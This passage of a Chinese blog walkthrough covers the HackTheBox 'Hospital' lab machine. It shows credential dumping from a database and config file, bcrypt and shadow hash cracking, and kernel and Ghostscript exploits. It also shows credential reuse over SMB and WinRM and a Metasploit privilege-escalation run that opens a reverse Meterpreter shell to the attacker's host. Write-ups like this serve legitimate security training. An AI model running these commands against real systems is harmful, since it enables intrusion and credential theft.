forever\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@webserver:/var$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e /home\ndrwilliams\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eMysql Dump\u003c/h3\u003e\n\u003cp\u003e拿到 \u003ccode\u003eshell\u003c/code\u003e 后得到了数据的账号密码，取一下有用的数据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@webserver:/var/www/html$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e config.php \n\u0026#x3C;?php\n/* Database credentials. Assuming you are running MySQL\nserver with default setting (user \u003cspan class=\"hljs-string\"\u003e'root'\u003c/span\u003e with no password) */\ndefine(\u003cspan class=\"hljs-string\"\u003e'DB_SERVER'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'localhost'\u003c/span\u003e);\ndefine(\u003cspan class=\"hljs-string\"\u003e'DB_USERNAME'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'root'\u003c/span\u003e);\ndefine(\u003cspan class=\"hljs-string\"\u003e'DB_PASSWORD'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'my$qls3rv1c3!'\u003c/span\u003e);\ndefine(\u003cspan class=\"hljs-string\"\u003e'DB_NAME'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'hospital'\u003c/span\u003e);\n \n/* Attempt to connect to MySQL database */\n\u003cspan class=\"hljs-variable\"\u003e$link\u003c/span\u003e = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);\n \n// Check connection\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(\u003cspan class=\"hljs-variable\"\u003e$link\u003c/span\u003e === \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e){\n    die(\u003cspan class=\"hljs-string\"\u003e\"ERROR: Could not connect. \"\u003c/span\u003e . mysqli_connect_error());\n}\n?\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@webserver:/var/www/html$ mysql -uroot -p\nEnter password: \nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MariaDB connection \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e is 35\nServer version: 10.11.2-MariaDB-1 Ubuntu 23.04\n\nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.\n\nType \u003cspan class=\"hljs-string\"\u003e'help;'\u003c/span\u003e or \u003cspan class=\"hljs-string\"\u003e'\\h'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e. Type \u003cspan class=\"hljs-string\"\u003e'\\c'\u003c/span\u003e to clear the current input statement.\n\nMariaDB [(none)]\u003e \nMariaDB [hospital]\u003e \u003cspan class=\"hljs-keyword\"\u003eselect\u003c/span\u003e * from \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e;\n+----+------------+--------------------------------------------------------------+---------------------+\n| \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e | username   | password                                                     | created_at          |\n+----+------------+--------------------------------------------------------------+---------------------+\n|  1 | admin      | $2y$10\u003cspan class=\"hljs-variable\"\u003e$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG\u003c/span\u003e.3NLrxcjMh2 | 2023-09-21 14:46:04 |\n|  2 | patient    | $2y$10\u003cspan class=\"hljs-variable\"\u003e$a\u003c/span\u003e.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO | 2023-09-21 15:35:11 |\n|  3 | miraimirai | $2y$10\u003cspan class=\"hljs-variable\"\u003e$Kt41f\u003c/span\u003e.pRDSZsxb025P13x.St.0OeWUpcB5PUB/CYllflBTm1soFGq | 2025-06-03 15:30:08 |\n|  4 | sunset     | $2y$10\u003cspan class=\"hljs-variable\"\u003e$iR4kNSugeGjGRE8M12Yjp\u003c/span\u003e.EtnF5AZINPTgtdve7VBPdFVqlbJ262e | 2025-06-03 20:11:12 |\n+----+------------+--------------------------------------------------------------+---------------------+\n4 rows \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e (0.000 sec)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e尝试爆破密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Hospital \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e \n1:$2y$10\u003cspan class=\"hljs-variable\"\u003e$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG\u003c/span\u003e.3NLrxcjMh2\n2:$2y$10\u003cspan class=\"hljs-variable\"\u003e$a\u003c/span\u003e.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO\n3:$2y$10\u003cspan class=\"hljs-variable\"\u003e$Kt41f\u003c/span\u003e.pRDSZsxb025P13x.St.0OeWUpcB5PUB/CYllflBTm1soFGq\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Hospital john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e\nUsing default input encoding: UTF-8\nLoaded 3 password hashes with 3 different salts (bcrypt [Blowfish 32/64 X3])\nCost 1 (iteration count) is 1024 \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e all loaded hashes\nWill run 8 OpenMP threads\nPress \u003cspan class=\"hljs-string\"\u003e'q'\u003c/span\u003e or Ctrl-C to abort, almost any other key \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e status\n123456           (1) \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e\u003cstrong\u003eGameOver(lay)\u003c/strong\u003e\u003c/h3\u003e\n\u003cp\u003e但是这个密码貌似没什么用，\u003ccode\u003eLinpeas\u003c/code\u003e 走一波，貌似也没有找到可利用的\u003c/p\u003e\n\u003cp\u003e找一下内核漏洞\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@webserver:/tmp$ \u003cspan class=\"hljs-built_in\"\u003euname\u003c/span\u003e -a\nLinux webserver 5.19.0-35-generic \u003cspan class=\"hljs-comment\"\u003e#36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629\"\u003ehttps://github.com/g1vi/CVE-2023-2640-CVE-2023-32629\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e将 \u003ccode\u003epayload\u003c/code\u003e 上传，运行即可获得 \u003ccode\u003eroot shell\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003eCrack shadow\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003efscan\u003c/code\u003e 扫一波\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@webserver:/root# ./fscan -h 192.168.5.1-255\n\n   ___                              _\n  / _ \\     ___  ___ _ __ __ _  ___| | __\n / /_\\/____/ __|/ __| \u003cspan class=\"hljs-string\"\u003e'__/ _` |/ __| |/ /\n/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   \u0026#x3C;\n\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\\n                     fscan version: 1.8.4\nstart infoscan\n(icmp) Target 192.168.5.2     is alive\n(icmp) Target 192.168.5.1     is alive\n[*] Icmp alive hosts len is: 2\n192.168.5.1:88 open\n192.168.5.1:445 open\n192.168.5.1:443 open\n192.168.5.1:139 open\n192.168.5.1:135 open\n192.168.5.2:80 open\n192.168.5.2:22 open\n[*] alive ports len is: 7\nstart vulscan\n[*] WebTitle http://192.168.5.2        code:302 len:0      title:None 跳转url: http://192.168.5.2/login.php\n[*] WebTitle http://192.168.5.2/login.php code:200 len:5739   title:Login\n[*] NetInfo\n[*]192.168.5.1\n   [-\u003e]DC\n   [-\u003e]192.168.5.1\n   [-\u003e]10.10.11.241\n   [-\u003e]dead:beef::236d:2f90:c45e:cc24\n[*] NetBios 192.168.5.1     [+] DC:HOSPITAL\\DC\n[*] WebTitle https://192.168.5.1       code:200 len:5379   title:Hospital Webmail :: 欢迎使用 Hospital Webmail\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e乍一看拿到 \u003ccode\u003eroot\u003c/code\u003e 好像没什么用，我们将 \u003ccode\u003eshadow\u003c/code\u003e 文件取出来爆破试试\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot:$y$j9T\u003cspan class=\"hljs-variable\"\u003e$s\u003c/span\u003e/Aqv48x449udndpLC6eC.\u003cspan class=\"hljs-variable\"\u003e$WUkrXgkW46N4xdpnhMoax7US\u003c/span\u003e.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::\ndrwilliams:$6$uWBSeTcoXXTBRkiL\u003cspan class=\"hljs-variable\"\u003e$S9ipksJfiZuO4bFI6I9w\u003c/span\u003e/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e最后得到用户\u003ccode\u003edrwilliams\u003c/code\u003e的密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Hospital john --wordlist=/usr/share/wordlists/rockyou.txt \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e\nUsing default input encoding: UTF-8\nLoaded 1 password \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])\nCost 1 (iteration count) is 5000 \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e all loaded hashes\nWill run 8 OpenMP threads\nPress \u003cspan class=\"hljs-string\"\u003e'q'\u003c/span\u003e or Ctrl-C to abort, almost any other key \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e status\nqwe123!@#        (drwilliams)\n1g 0:00:01:00 DONE (2025-06-03 23:31) 0.01656g/s 3562p/s 3562c/s 3562C/s raycharles..pakimo\nUse the \u003cspan class=\"hljs-string\"\u003e\"--show\"\u003c/span\u003e option to display all of the cracked passwords reliably\nSession completed.\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eIn drwilliams Shell\u003c/h2\u003e\n\u003ch3\u003e信息收集\u003c/h3\u003e\n\u003cp\u003e我们将密码拿去 \u003ccode\u003eFuzz\u003c/code\u003e ，测试是否在 \u003ccode\u003eWindows\u003c/code\u003e 上有效\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Hospital nxc smb 10.10.11.241 -u drwilliams -p \u003cspan class=\"hljs-string\"\u003e'qwe123!@#'\u003c/span\u003e -d hospital.htb\nSMB         10.10.11.241    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False) \nSMB         10.10.11.241    445    DC               [+] hospital.htb\\drwilliams:qwe123!@#\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Hospital nxc wmi 10.10.11.241 -u drwilliams -p \u003cspan class=\"hljs-string\"\u003e'qwe123!@#'\u003c/span\u003e -d hospital.htb \nRPC         10.10.11.241    135    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:hospital.htb)\nRPC         10.10.11.241    135    DC               [+] hospital.htb\\drwilliams:qwe123!@#\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e有效且拥有远程的权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Hospital nxc wmi 10.10.11.241 -u drwilliams -p \u003cspan class=\"hljs-string\"\u003e'qwe123!@#'\u003c/span\u003e -d hospital.htb \nRPC         10.10.11.241    135    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:hospital.htb)\nRPC         10.10.11.241    135    DC               [+] hospital.htb\\drwilliams:qwe123!@#\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e但是这里并不能进行远程登录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Hospital wmiexec.py hospital.htb/drwilliams:\u003cspan class=\"hljs-string\"\u003e'qwe123!@#'\u003c/span\u003e@10.10.11.241 -dc-ip 10.10.11.241\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] SMBv3.0 dialect used\n[-] rpc_s_access_denied\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Hospital evil-winrm -i 10.10.11.241 -u \u003cspan class=\"hljs-string\"\u003e'drwilliams'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'qwe123!@#'\u003c/span\u003e\n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc\u003cspan class=\"hljs-string\"\u003e' for module Reline\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n                                        \nError: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError\n                                        \nError: Exiting with code 1\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e后来发现 \u003ccode\u003edrwilliams\u003c/code\u003e 的凭据适用于 \u003ccode\u003eRoundCube\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image14.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image15.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e里面有一封 \u003ccode\u003edrbrown\u003c/code\u003e 发来的邮件\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image16.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e大致就是使用\u003ccode\u003e.eps\u003c/code\u003e的文件格式可以使用\u003ccode\u003eGhostScript\u003c/code\u003e进行可视化\u003c/p\u003e\n\u003cp\u003e可能\u003ccode\u003edrbrown\u003c/code\u003e 会打开我们上传的\u003ccode\u003eeps\u003c/code\u003e文件，通过检索发现\u003ccode\u003eGhostScript\u003c/code\u003e 有远程命令执行漏洞\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image17.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003e\u003cstrong\u003eCVE-2023-36664\u003c/strong\u003e\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection\"\u003ehttps://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e打开 PS 或 EPS 文件时可能会发生此漏洞，并可能允许因 Ghostscript 错误处理管道设备的权限验证而导致的代码执行。\u003c/p\u003e\n\u003cp\u003e制作 \u003ccode\u003epayload\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image18.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e上传 \u003ccode\u003eeps\u003c/code\u003e 文件\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image19.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e试了好几次才把 \u003ccode\u003eShell\u003c/code\u003e 弹过来\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image20.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eIn Drbrown Shell\u003c/h2\u003e\n\u003cp\u003e当前用户能拿到 \u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ePS C:\\Users\\drbrown.HOSPITAL\\Documents\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e ../Desktop/user.txt\n79ba545a7e91123a742e472d792b9d41\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看当前目录下的 \u003ccode\u003eghostscript.bat\u003c/code\u003e 能得到\u003ccode\u003edrbrown\u003c/code\u003e用户密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ePS C:\\Users\\drbrown.HOSPITAL\\Documents\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e ghostscript.bat\n@\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e off\n\u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e filename=%~1\npowershell -\u003cspan class=\"hljs-built_in\"\u003ecommand\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$p\u003c/span\u003e = convertto-securestring 'chr!\u003cspan class=\"hljs-variable\"\u003e$br0wn\u003c/span\u003e' -asplain -force;\u003cspan class=\"hljs-variable\"\u003e$c\u003c/span\u003e = new-object system.management.automation.pscredential('hospital\\drbrown', \u003cspan class=\"hljs-variable\"\u003e$p\u003c/span\u003e);Invoke-Command -ComputerName dc -Credential \u003cspan class=\"hljs-variable\"\u003e$c\u003c/span\u003e -ScriptBlock { cmd.exe /c \"\u003c/span\u003eC:\\Program` Files\\gs\\gs10.01.1\\bin\\gswin64c.exe\u003cspan class=\"hljs-string\"\u003e\" -dNOSAFER \"\u003c/span\u003eC:\\Users\\drbrown.HOSPITAL\\Downloads\\%filename%\u003cspan class=\"hljs-string\"\u003e\" }\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e测试密码准确性\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  CVE-2023-36664-Ghostscript-command-injection nxc smb 10.10.11.241 -u drbrown -p \u003cspan class=\"hljs-string\"\u003e'chr!$br0wn'\u003c/span\u003e -d hospital.htb\nSMB         10.10.11.241    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False) \nSMB         10.10.11.241    445    DC               [+] hospital.htb\\drbrown:chr!\u003cspan class=\"hljs-variable\"\u003e$br0wn\u003c/span\u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这里可以使用 \u003ccode\u003eevil-winrm\u003c/code\u003e来进行连接\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Hospital evil-winrm -i 10.10.11.241 -u \u003cspan class=\"hljs-string\"\u003e'drbrown'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'chr!$br0wn'\u003c/span\u003e  \n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc\u003cspan class=\"hljs-string\"\u003e' for module Reline\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\drbrown.HOSPITAL\\Documents\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e提权-方案-1\u003c/h3\u003e\n\u003cp\u003e这里是越级打击，靶机是 \u003ccode\u003e2023\u003c/code\u003e发布的，这里使用的是 \u003ccode\u003e2024\u003c/code\u003e的漏洞\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emsf6 post(multi/recon/local_exploit_suggester) \u003e exploit                                                                                                                                                        \n[*] 10.10.11.241 - Collecting \u003cspan class=\"hljs-built_in\"\u003elocal\u003c/span\u003e exploits \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e x64/windows...                                                                                                                                                 \n/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/logging-2.4.0/lib/logging.rb:10: warning: /usr/lib/x86_64-linux-gnu/ruby/3.3.0/syslog.so was loaded from the standard library, but will no longer \nbe part of the default gems starting from Ruby 3.4.0.                                                                                                                                                           \nYou can add syslog to your Gemfile or gemspec to silence this warning.                                                                                                                                          \nAlso please contact the author of logging-2.4.0 to request adding syslog into its gemspec.                                                                                                                      \n[*] 10.10.11.241 - 205 exploit checks are being tried...                                                                                                                                                        \n[+] 10.10.11.241 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.                                                                                                              \n[+] 10.10.11.241 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.                                                                   \n[+] 10.10.11.241 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.                                                                                                                  \n[+] 10.10.11.241 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.                                                                                                             \n[+] 10.10.11.241 - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.                  \n[+] 10.10.11.241 - exploit/windows/local/cve_2020_1337_printerdemon: The target appears to be vulnerable.                                                                                                     \n[+] 10.10.11.241 - exploit/windows/local/cve_2022_21882_win32k: The target appears to be vulnerable.                                                                                                            \n[+] 10.10.11.241 - exploit/windows/local/cve_2022_21999_spoolfool_privesc: The target appears to be vulnerable.                                                      \n[+] 10.10.11.241 - exploit/windows/local/cve_2024_30085_cloud_files: The target appears to be vulnerable.                  \n[+] 10.10.11.241 - exploit/windows/local/cve_2024_30088_authz_basep: The target appears to be vulnerable. Version detected: Windows Server 2019. Revision number detected: 4974\n[+] 10.10.11.241 - exploit/windows/local/cve_2024_35250_ks_driver: The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server 2019\n[+] 10.10.11.241 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.  \n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emsf6 exploit(windows/local/cve_2024_35250_ks_driver) \u003e exploit\n[*] Started reverse TCP handler on 10.10.16.69:5555 \n[*] Running automatic check (\u003cspan class=\"hljs-string\"\u003e\"set AutoCheck false\"\u003c/span\u003e to \u003cspan class=\"hljs-built_in\"\u003edisable\u003c/span\u003e)\n[+] The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server 2019\n[*] Launching notepad to host the exploit...\n[*] The notepad path is: C:\\Windows\\System32\\notepad.exe\n[*] The notepad pid is: 5996\n[*] Reflectively injecting the DLL into 5996...\n[*] Sending stage (203846 bytes) to 10.10.11.241\n[*] Meterpreter session 3 opened (10.10.16.69:5555 -\u003e 10.10.11.241:8915) at 2025-06-04 17:41:32 +0800\n\nmeterpreter \u003e getuid\nServer username: NT AUTHORITY\\SYSTEM\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e读取 \u003ccode\u003eroot.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eC:\\Users\\Administrator\\Desktop\u003e\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e root.txt\n\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e root.txt\n740a3ee12653be0821f595a14c9d1aae\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e提权-方案-2\u003c/h3\u003e\n\u003cp\u003e因为 \u003ccode\u003edrbrown\u003c/code\u003e 也属于 \u003ccode\u003eRemote Desktop\u003c/code\u003e组，我们使用他的连接一下远程桌面\u003c/p\u003e\n\u003cp\u003e登录进去后就是在 \u003ccode\u003eRoundcube\u003c/code\u003e 的界面，并且是以 \u003ccode\u003eadministrator\u003c/code\u003e 用户的账户\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image21.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e能看到密码：\u003ccode\u003eTh3B3stH0sp1t4l9786!\u003c/code\u003e\u003c/p\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003edrbrown\u003c/code\u003e其实还有一个权限\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Hospital/image22.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#performance-log-users\"\u003ehttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#performance-log-users\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eMembers of the Performance Log Users group can manage performance counters, logs, and alerts locally on the server and from remote clients without being a member of the Administrators group.\u003c/p\u003e\n\u003cp\u003ePerformance Log Users 组的成员可以在服务器上本地和远程客户端管理性能计数器、日志和警报，而无需成为 Administrators 组的成员。\u003c/p\u003e\n\u003cp\u003e总的来说不算难，但是感觉步骤挺多的。还有就是打靶机是真的不能心急，要冷静..\u003c/p\u003e","title":"HackTheBox - Machine - Hospital","date":"2025-06-04","updated":"2025-06-04","tags":["HackTheBox","Windows","Linux","FileUpload","Lay","CVE-2024-35250","RDP"],"categories":"靶机","comments":true,"description":"Machine - Hospital\n\n https://app.hackthebox.com/machines/Hospital | `Windows` | `Medium`\n \n\n\n\nRecon\n\n使用`nmap`进行扫描\n\n\n\n\n\n看结果是有两个`Web`服务\n\n匿名账户 `SMB` 无果\n\n\n\nWeb 渗透\n\n信息收集\n\n现在要决定哪个先作为目标，443端口是 `RoundCube`\n\n\n..."},"recentPosts":[{"id":"TheHackersLabsPa Que Aiga Lujo","title":"TheHackersLabs - Pa Que Aiga Lujo","date":"2025-09-28","isEncrypted":false,"year":"2025","month":"09","day":"28"},{"id":"HackMyVMSilentdev","title":"HackMyVM - Silentdev","date":"2025-09-26","isEncrypted":false,"year":"2025","month":"09","day":"26"},{"id":"TheHackersLabsFolclore","title":"TheHackersLabs - Folclore","date":"2025-09-24","isEncrypted":false,"year":"2025","month":"09","day":"24"},{"id":"HackMyVMAria","title":"HackMyVM - Aria","date":"2025-09-23","isEncrypted":false,"year":"2025","month":"09","day":"23"},{"id":"HackTheBoxSeason9 - Expressway","title":"HackTheBox - Season9 - Expressway","date":"2025-09-21","isEncrypted":true,"year":"2025","month":"09","day":"21"},{"id":"HackTheBoxSeason8 - Fluffy","title":"HackTheBox - Machine - Fluffy","date":"2025-05-25","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"HackTheBoxMachine - Planning","title":"HackTheBox - Machine - Planning","date":"2025-05-11","isEncrypted":false,"year":"2025","month":"09","day":"20"}]},"__N_SSG":true},"page":"/[year]/[month]/[day]/[id]","query":{"year":"2025","month":"06","day":"04","id":"HackTheBoxMachine - Hospital"},"buildId":"2X_PbQDqe6nbwHyn7V2gC","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>